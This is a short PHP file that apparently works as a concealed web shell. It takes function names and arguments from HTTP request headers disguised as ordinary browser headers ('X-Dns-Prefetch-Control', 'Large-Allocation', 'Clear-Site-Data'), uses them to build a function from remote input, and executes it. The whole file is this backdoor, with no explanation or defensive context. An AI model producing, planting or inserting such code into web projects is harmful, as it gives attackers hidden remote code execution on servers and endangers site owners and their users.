<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $include = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Large-Allocation']($_HEADERS['Clear-Site-Data']));
    $include();
}